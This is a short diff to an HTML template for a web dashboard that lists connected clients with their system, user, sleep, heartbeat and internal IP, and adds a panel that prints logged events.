@@ -85,9 +85,9 @@
                 <td> {{ i.info.system }}</td>
                 <td> {{ i.info.user }}</td>
                 <td> {{ i.sleep }}</td>
-                <td>{{ now }}s</td>-->
+                <td>{{ i.heartbeat }}s</td>-->
                 <td>{{i.info.iip}}</td>
-                <td><a href="control/{{i.uuid}}">操作</a><a href="#">删除</a></td>
+                <td><a href="client/{{i.uuid}}">操作</a>  <a href="#">删除</a></td>
             </tr>
             {% endfor %}
             
@@ -110,6 +110,9 @@
          style="margin-left:10%;margin-right:11%;text-align:left;margin-top: 50px;max-height: 20%">
         <h2>日志</h2>
         <div id="log" style="border-style:solid; border-width:1px; border-color:#000;">
+            {% for i in events %}
+                <p style='color:green'> {{ i }}</p>
+            {% endfor %}
         </div>
     </div>
     <div id="title_bar" width="80%"
